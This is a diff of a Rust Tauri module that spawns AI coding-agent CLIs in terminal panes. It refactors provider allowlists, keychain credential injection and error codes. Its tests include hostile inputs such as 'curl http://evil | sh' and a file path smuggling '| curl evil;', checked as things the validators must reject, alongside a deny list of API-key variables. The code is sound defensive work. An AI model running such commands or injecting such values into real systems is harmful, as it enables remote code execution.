@@ -7,6 +7,9 @@ use std::thread;
 use std::time::{Duration, Instant};
 use tauri::{AppHandle, Emitter, Manager, State};
 
+use crate::error_code::CodedError;
+use crate::keychain;
+
 
 // Process-tree cleanup lives in the shared proc_tree module (Phase 3): review verification and
 // acceptance runners need the same Job Object / process-group teardown as PTY panes.
@@ -162,13 +165,6 @@ fn emit_remaining_lossy(pending: &mut Vec<u8>, app_handle: &AppHandle, id: &str)
     pending.clear();
 }
 
-// Whether a provider's CLI accepts a prompt piped on stdin / via file redirect.
-// GUI-oriented agents (cursor, copilot) are launched interactively instead of
-// having the prompt file redirected into them.
-fn provider_accepts_prompt_pipe(provider: &str) -> bool {
-    !matches!(provider, "cursor" | "copilot")
-}
-
 // Interactive prompt delivery (Phase 3 live coordinator): how long to wait after spawn before
 // typing the prompt into the provider TUI, and the gap between the paste and the Enter keypress.
 // ponytail: fixed delay; promote to a per-provider readiness probe if a CLI proves slower to boot.
@@ -186,23 +182,8 @@ fn bracketed_paste(prompt: &str) -> String {
 // string must pass through the validators below. (`custom_command` is exempt by design: like the
 // review verification command, it is operator-typed and shown verbatim in the UI before launch.)
 
-/// Allowlist of launchable provider CLIs. Returns the executable invocation for a known
-/// provider id, `None` otherwise — an unknown provider must never run verbatim as a command.
-fn provider_command(provider: &str) -> Option<&'static str> {
-    match provider {
-        "codex" => Some("codex"),
-        "claude" => Some("claude"),
-        "gemini" => Some("gemini"),
-        "openrouter" => Some("openrouter"),
-        "opencode" => Some("opencode"),
-        "cursor" => Some("cursor-agent"),
-        "droid" => Some("droid"),
-        "copilot" => Some("gh copilot"),
-        "pi" => Some("pi"),
-        "grok" => Some("grok"),
-        _ => None,
-    }
-}
+/// Allowlist of launchable provider CLIs lives in `providers.rs` (single owner of provider
+/// facts); `spawn_pty` resolves through it so an unknown provider never runs verbatim.
 
 /// Model names are interpolated inside a double-quoted shell string; restrict them to
 /// characters that are inert there (no `"`, backtick, `$`, backslash, whitespace, ...).
@@ -216,17 +197,24 @@ fn is_safe_model(model: &str) -> bool {
 /// A prompt file is interpolated into the shell command line as a redirect source. Require it
 /// to be free of shell metacharacters, project-contained (relative, no `..` — enforced by
 /// `get_project_file_path`), and already existing.
-fn validate_prompt_file(cwd: &str, prompt_file: &str) -> Result<(), String> {
+fn validate_prompt_file(cwd: &str, prompt_file: &str) -> Result<(), CodedError> {
     const FORBIDDEN: &[char] = &['"', '\'', '`', '$', '<', '>', '|', ';', '&', '\n', '\r'];
     if prompt_file.contains(FORBIDDEN) {
-        return Err("Prompt file path contains forbidden characters".to_string());
+        return Err(CodedError::invalid_path(
+            "Prompt file path contains forbidden characters",
+        ));
     }
     if cwd.is_empty() {
-        return Err("Prompt file requires a project working directory".to_string());
+        return Err(CodedError::root_not_approved(
+            "Prompt file requires a project working directory",
+        ));
     }
-    let resolved = crate::project::get_project_file_path(cwd, prompt_file)?;
+    let resolved = crate::project_roots::get_project_file_path(cwd, prompt_file)?;
     if !resolved.is_file() {
-        return Err(format!("Prompt file not found in project: {}", prompt_file));
+        return Err(CodedError::invalid_path(format!(
+            "Prompt file not found in project: {}",
+            prompt_file
+        )));
     }
     Ok(())
 }
@@ -266,27 +254,9 @@ fn is_forbidden_env_key(key: &str) -> bool {
     FORBIDDEN.contains(&k.as_str())
 }
 
-/// Provider credential variables are constructed by Rust from the OS keychain; renderer-
-/// supplied values for these names are refused so a pane can never run with attacker-chosen
-/// credentials (or shadow the keychain-injected ones).
-fn is_provider_env_key(key: &str) -> bool {
-    const PROVIDER_KEYS: &[&str] = &[
-        "openai_api_key",
-        "anthropic_api_key",
-        "gemini_api_key",
-        "google_api_key",
-        "opencode_api_key",
-        "openrouter_api_key",
-        "cursor_api_key",
-        "factory_api_key",
-        "github_token",
-        "pi_api_key",
-        "grok_api_key",
-        "custom_api_key",
-    ];
-    let k = key.to_ascii_lowercase();
-    PROVIDER_KEYS.contains(&k.as_str())
-}
+/// Provider credential variables are constructed by Rust from the OS keychain; the
+/// renderer-refusal list is derived from the provider table in `providers.rs`
+/// (`is_provider_env_key`). Execution-affecting keys are refused separately below.
 
 #[allow(clippy::too_many_arguments)]
 #[tauri::command]
@@ -303,7 +273,7 @@ pub async fn spawn_pty(
     app_handle: AppHandle,
     registry: State<'_, PtyRegistry>,
     roots: State<'_, Arc<crate::project_roots::ProjectRootRegistry>>,
-) -> Result<(), String> {
+) -> Result<(), CodedError> {
     // Phase 4 audit: spawning a PTY is a privileged action (it runs shells and agent CLIs inside
     // an approved root). One line per spawn attempt - success or refusal - with the provider tag
     // so pane launches are distinguishable from plain shells in the audit trail.
@@ -315,7 +285,10 @@ pub async fn spawn_pty(
         interactive_prompt, app_handle, registry, roots,
     )
     .await;
-    let audited = result.as_ref().map(|()| crate::audit::Outcome::ok()).map_err(|e| e.clone());
+    let audited = match &result {
+        Ok(()) => Ok(crate::audit::Outcome::ok()),
+        Err(e) => Err(e.message.clone()),
+    };
     crate::audit::record(
         "renderer",
         &format!("spawn_pty({})", provider_tag),
@@ -326,6 +299,7 @@ pub async fn spawn_pty(
     result
 }
 
+#[allow(clippy::too_many_arguments)]
 async fn spawn_pty_inner(
     id: String,
     cwd: String,
@@ -339,7 +313,7 @@ async fn spawn_pty_inner(
     app_handle: AppHandle,
     registry: State<'_, PtyRegistry>,
     roots: State<'_, Arc<crate::project_roots::ProjectRootRegistry>>,
-) -> Result<(), String> {
+) -> Result<(), CodedError> {
     // Trust boundary (Phase 1): a pane may only run inside an approved project root or,
     // as the one deliberate exception, the user's home directory (plain home shells).
     if !cwd.is_empty() {
@@ -350,7 +324,7 @@ async fn spawn_pty_inner(
     // reader/emitter/writer threads (kill_pty would only ever reap the survivor). Check up front
     // (cheap, before spawning anything); the insert below re-checks to close the race window.
     if registry.sessions.lock().unwrap().contains_key(&id) {
-        return Err(format!("PTY session {} already exists", id));
+        return Err(CodedError::already_exists(format!("PTY session {} already exists", id)));
     }
 
     // Resolved on the async task (needs the AppHandle); consumed inside the blocking
@@ -405,7 +379,7 @@ async fn spawn_pty_inner(
 
     if let Some(provider) = ai_provider.as_deref() {
         if provider != "custom" {
-            let provider_cleaned = provider_command(provider)
+            let provider_cleaned = crate::providers::launch_command(provider)
                 .ok_or_else(|| format!("Unknown AI provider: {}", provider))?;
 
             let model_str = model.as_deref().unwrap_or("default");
@@ -419,14 +393,14 @@ async fn spawn_pty_inner(
             // TUI and the prompt is typed into it once it is ready).
             let pipe_file = prompt_file
                 .as_ref()
-                .filter(|_| provider_accepts_prompt_pipe(provider) && !interactive_delivery);
+                .filter(|_| crate::providers::accepts_prompt_pipe(provider) && !interactive_delivery);
             if let Some(p_file) = pipe_file {
                 validate_prompt_file(&cwd, p_file)?;
             }
             if interactive_delivery {
                 if let Some(p_file) = prompt_file.as_ref() {
                     validate_prompt_file(&cwd, p_file)?;
-                    let resolved = crate::project::get_project_file_path(&cwd, p_file)?;
+                    let resolved = crate::project_roots::get_project_file_path(&cwd, p_file)?;
                     injected_prompt =
                         Some(std::fs::read_to_string(&resolved).map_err(|e| e.to_string())?);
                 }
@@ -548,7 +522,7 @@ async fn spawn_pty_inner(
     // keys (see `is_forbidden_env_key` / `is_provider_env_key`). Everything else the
     // renderer sends still applies, on top of the defaults above.
     for (k, v) in env {
-        if is_forbidden_env_key(&k) || is_provider_env_key(&k) {
+        if is_forbidden_env_key(&k) || crate::providers::is_provider_env_key(&k) {
             return Err(format!(
                 "Environment variable '{}' may not be set by the renderer",
                 k
@@ -557,40 +531,23 @@ async fn spawn_pty_inner(
         cmd.env(k, v);
     }
     
-    // Auto-inject provider API key from OS Keychain if configured
-    let key_service = match ai_provider.as_deref() {
-        Some("codex") => Some(("saple_provider_codex_api_key", "OPENAI_API_KEY")),
-        Some("claude") => Some(("saple_provider_claude_api_key", "ANTHROPIC_API_KEY")),
-        Some("gemini") => Some(("saple_provider_gemini_api_key", "GEMINI_API_KEY")),
-        Some("opencode") => Some(("saple_provider_opencode_api_key", "OPENCODE_API_KEY")),
-        Some("openrouter") => Some(("saple_provider_openrouter_api_key", "OPENROUTER_API_KEY")),
-        Some("cursor") => Some(("saple_provider_cursor_api_key", "CURSOR_API_KEY")),
-        Some("droid") => Some(("saple_provider_droid_api_key", "FACTORY_API_KEY")),
-        Some("copilot") => Some(("saple_provider_copilot_api_key", "GITHUB_TOKEN")),
-        Some("pi") => Some(("saple_provider_pi_api_key", "PI_API_KEY")),
-        Some("grok") => Some(("saple_provider_grok_api_key", "GROK_API_KEY")),
-        Some("custom") => Some(("saple_provider_custom_api_key", "CUSTOM_API_KEY")),
-        _ => None,
-    };
-
-    if let Some((service, env_var)) = key_service {
-        if let Ok(entry) = keyring::Entry::new(service, "saple_bridge_user") {
-            if let Ok(password) = entry.get_password() {
-                cmd.env(env_var, &password);
-                if env_var == "GEMINI_API_KEY" {
-                    cmd.env("GOOGLE_API_KEY", &password);
-                }
+    // Auto-inject provider API key from OS Keychain if configured. Service name, credential
+    // env var, vendor mirrors and the legacy fallback slot all come from the provider table
+    // in `providers.rs`; the account is the keychain module's pinned user.
+    if let Some(facts) = ai_provider.as_deref().and_then(crate::providers::facts) {
+        let service = crate::providers::keychain_service(facts.id);
+        if let Ok(password) = keychain::get_api_key_inner(service) {
+            cmd.env(facts.credential_env, &password);
+            for mirror in facts.credential_env_mirrors {
+                cmd.env(mirror, &password);
             }
         }
-    }
-    
-    // Legacy fallback: the pre-`saple_provider_*` keychain entry. Only inject it for codex panes —
-    // it sets OPENAI_API_KEY, which is meaningless (and a needless secret leak) in the env of a
-    // claude/gemini/etc. CLI.
-    if matches!(ai_provider.as_deref(), Some("codex")) {
-        if let Ok(entry) = keyring::Entry::new("openai_api_key", "saple_bridge_user") {
-            if let Ok(password) = entry.get_password() {
-                cmd.env("OPENAI_API_KEY", password);
+        // Legacy pre-namespaced entry: inject it after (so it wins over) the namespaced
+        // value. Only codex has one - its OPENAI_API_KEY is meaningless (and a needless
+        // secret leak) in the env of a claude/gemini/etc. CLI.
+        if let Some(legacy) = facts.legacy_keychain_service {
+            if let Ok(password) = keychain::get_api_key_inner(legacy.to_string()) {
+                cmd.env(facts.credential_env, password);
             }
         }
     }
@@ -639,7 +596,10 @@ async fn spawn_pty_inner(
                 job.terminate();
             }
             let _ = new_session.child.kill();
-            return Err(format!("PTY session {} already exists", id));
+            return Err(CodedError::already_exists(format!(
+                "PTY session {} already exists",
+                id
+            )));
         }
         sessions.insert(id.clone(), session.clone());
     }
@@ -817,7 +777,7 @@ pub async fn write_pty(
     id: String,
     data: String,
     registry: State<'_, PtyRegistry>,
-) -> Result<PtyWriteOutcome, String> {
+) -> Result<PtyWriteOutcome, CodedError> {
     // Clone the sender under the lock, then release it — we never block while holding the mutex,
     // and the actual write happens on the per-session writer thread. This is what lets a wedged
     // child (one that stopped reading its stdin) still be closed: a stuck write can no longer pin
@@ -826,7 +786,7 @@ pub async fn write_pty(
         let sessions = registry.sessions.lock().unwrap();
         let session_arc = sessions
             .get(&id)
-            .ok_or_else(|| format!("PTY session {} not found", id))?;
+            .ok_or_else(|| CodedError::pty_not_found(format!("PTY session {} not found", id)))?;
         let session = session_arc.lock().unwrap();
         session
             .writer_tx
@@ -857,7 +817,7 @@ pub async fn write_pty(
         Err(mpsc::TrySendError::Disconnected(_)) => {
             let err = format!("PTY session {} writer closed", id);
             crate::audit::record("renderer", "write_pty", None, Instant::now(), &Err(err.clone()));
-            Err(err)
+            Err(CodedError::internal(err))
         }
     }
 }
@@ -868,18 +828,18 @@ pub async fn resize_pty(
     cols: u16,
     rows: u16,
     registry: State<'_, PtyRegistry>,
-) -> Result<(), String> {
+) -> Result<(), CodedError> {
     let session_arc = registry
         .sessions
         .lock()
         .unwrap()
         .get(&id)
         .cloned()
-        .ok_or_else(|| format!("PTY session {} not found", id))?;
+        .ok_or_else(|| CodedError::pty_not_found(format!("PTY session {} not found", id)))?;
 
     // Off the main thread (see `write_pty`): `master.resize` can block, and a synchronous command
     // would stall the UI thread during the burst of resizes a window maximize/restore produces.
-    tauri::async_runtime::spawn_blocking(move || -> Result<(), String> {
+    tauri::async_runtime::spawn_blocking(move || -> Result<(), CodedError> {
         let session = session_arc.lock().unwrap();
         let size = PtySize {
             cols,
@@ -887,7 +847,11 @@ pub async fn resize_pty(
             pixel_width: 0,
             pixel_height: 0,
         };
-        session.pair.master.resize(size).map_err(|e| e.to_string())
+        session
+            .pair
+            .master
+            .resize(size)
+            .map_err(|e| CodedError::internal(e.to_string()))
     })
     .await
     .map_err(|e| e.to_string())?
@@ -897,13 +861,13 @@ pub async fn resize_pty(
 pub fn kill_pty(
     id: String,
     registry: State<'_, PtyRegistry>,
-) -> Result<(), String> {
+) -> Result<(), CodedError> {
     let session_arc = registry
         .sessions
         .lock()
         .unwrap()
         .remove(&id)
-        .ok_or_else(|| format!("PTY session {} not found", id))?;
+        .ok_or_else(|| CodedError::pty_not_found(format!("PTY session {} not found", id)))?;
 
     thread::spawn(move || {
         // Kill the child and take the thread handles + the input sender while holding the lock,
@@ -956,12 +920,12 @@ mod tests {
 
     #[test]
     fn provider_allowlist_rejects_unknown_commands() {
-        assert_eq!(provider_command("codex"), Some("codex"));
-        assert_eq!(provider_command("cursor"), Some("cursor-agent"));
-        assert_eq!(provider_command("grok"), Some("grok"));
-        assert_eq!(provider_command("curl http://evil | sh"), None);
-        assert_eq!(provider_command("custom"), None);
-        assert_eq!(provider_command(""), None);
+        assert_eq!(crate::providers::launch_command("codex"), Some("codex"));
+        assert_eq!(crate::providers::launch_command("cursor"), Some("cursor-agent"));
+        assert_eq!(crate::providers::launch_command("grok"), Some("grok"));
+        assert_eq!(crate::providers::launch_command("curl http://evil | sh"), None);
+        assert_eq!(crate::providers::launch_command("custom"), None);
+        assert_eq!(crate::providers::launch_command(""), None);
     }
 
     #[test]
@@ -1023,6 +987,32 @@ mod tests {
     }
 
     #[test]
+    fn prompt_file_failures_carry_stable_error_codes() {
+        use crate::error_code::ErrorCode;
+        let dir = temp_project();
+        let cwd = dir.to_str().unwrap();
+
+        let metachars = validate_prompt_file(cwd, ".saple/a\" | curl evil; \".md")
+            .expect_err("metacharacters must be refused");
+        assert_eq!(metachars.code, ErrorCode::InvalidPath);
+
+        let missing = validate_prompt_file(cwd, ".saple/missing.md")
+            .expect_err("missing file must be refused");
+        assert_eq!(missing.code, ErrorCode::InvalidPath);
+
+        let no_project =
+            validate_prompt_file("", ".saple/agents/prompts/p.md").expect_err("empty cwd");
+        assert_eq!(no_project.code, ErrorCode::RootNotApproved);
+
+        // Containment refusals flow through the shared path policy unchanged.
+        let traversal = validate_prompt_file(cwd, "../outside.md")
+            .expect_err("traversal must be refused");
+        assert_eq!(traversal.code, ErrorCode::PathOutsideRoot);
+
+        fs::remove_dir_all(dir).ok();
+    }
+
+    #[test]
     fn forbidden_env_keys_table() {
         struct Case {
             key: &'static str,
@@ -1072,9 +1062,9 @@ mod tests {
             "GEMINI_API_KEY",
             "CUSTOM_API_KEY",
         ] {
-            assert!(is_provider_env_key(key), "{key} must be refused");
+            assert!(crate::providers::is_provider_env_key(key), "{key} must be refused");
         }
-        assert!(!is_provider_env_key("MY_API_KEY"));
+        assert!(!crate::providers::is_provider_env_key("MY_API_KEY"));
     }
 
     #[test]
